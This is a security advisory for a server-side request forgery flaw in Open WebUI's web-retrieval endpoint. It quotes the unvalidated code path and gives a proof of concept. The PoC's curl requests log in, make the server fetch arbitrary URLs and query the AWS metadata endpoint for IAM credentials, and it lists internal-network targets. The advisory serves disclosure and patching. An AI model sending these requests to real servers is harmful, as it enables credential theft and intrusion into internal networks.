# Open WebUI vulnerable to Server-Side Request Forgery (SSRF) via Arbitrary URL Processing in /api/v1/retrieval/process/web

**GHSA**: GHSA-c6xv-rcvw-v685 | **CVE**: CVE-2025-65958 | **Severity**: high (CVSS 8.5)

**CWE**: CWE-918

**Affected Packages**:
- **open-webui** (pip): <= 0.6.36

## Description

### Summary
A Server-Side Request Forgery (SSRF) vulnerability in Open WebUI allows any authenticated user to force the server to make HTTP requests to arbitrary URLs. This can be exploited to access cloud metadata endpoints (AWS/GCP/Azure), scan internal networks, access internal services behind firewalls, and exfiltrate sensitive information. No special permissions beyond basic authentication are required.


### Details
The vulnerability exists in the /api/v1/retrieval/process/web endpoint located in backend/open_webui/routers/retrieval.py at lines 1758-1767.

  Vulnerable code:
  @router.post("/process/web")
  def process_web(
      request: Request, form_data: ProcessUrlForm, user=Depends(get_verified_user)
  ):
      try:
          collection_name = form_data.collection_name
          if not collection_name:
              collection_name = calculate_sha256_string(form_data.url)[:63]

          content, docs = get_content_from_url(request, form_data.url)  # ← SSRF vulnerability

The form_data.url parameter is passed directly to get_content_from_url() without any validation. This function chain ultimately calls web loaders that fetch arbitrary URLs:

  Call chain:
  1. retrieval.py:1767 → get_content_from_url(request, form_data.url)
  2. retrieval/utils.py:77 → get_loader(request, url)
  3. retrieval/utils.py:62 → get_web_loader(url, ...) or YoutubeLoader(url, ...)
  4. Both loaders fetch the user-supplied URL without validation

  No validation is performed for:
  - Private IP ranges (RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
  - Localhost addresses (127.0.0.0/8)
  - Cloud metadata endpoints (169.254.169.254, fd00:ec2::254)
  - Protocol restrictions (file://, gopher://, etc.)
  - Domain allowlisting


### PoC
Prerequisites: Valid user account (any role)

  Step 1 - Authenticate:
  TOKEN=$(curl -s "http://localhost:3000/api/v1/auths/signin" \
    -H 'Content-Type: application/json' \
    -d '{"email":"user@example.com","password":"password"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

  Step 2 - Basic SSRF Test (external URL):
  curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://example.com"}'

  Result: Server fetches example.com and returns its content, proving the vulnerability.

  {
    "status": true,
    "file": {
      "data": {
        "content": "Example Domain This domain is for use in documentation..."
      }
    }
  }

  Step 3 - Advanced Attack (AWS metadata):
  curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

  Result: Server exposes cloud credentials if running on AWS/GCP/Azure.

  Other attack examples:
  - Internal network: {"url":"http://192.168.1.1"}
  - Localhost services: {"url":"http://localhost:5432"}
  - Internal APIs: {"url":"http://internal-api.local"}


### Impact
Who is affected: All authenticated users (no special permissions required)

  Attack capabilities:

  1. Cloud Environment Compromise
    - Steal AWS/GCP/Azure credentials via metadata endpoints
    - Result: Full cloud account takeover
  2. Internal Network Access
    - Bypass firewalls to access internal services (databases, admin panels, APIs)
    - Port scan and map internal infrastructure
    - Result: Complete network visibility
  3. Data Exfiltration
    - Read internal documentation, configurations, secrets
    - Access Kubernetes API servers
    - Result: Credential theft, API key exposure
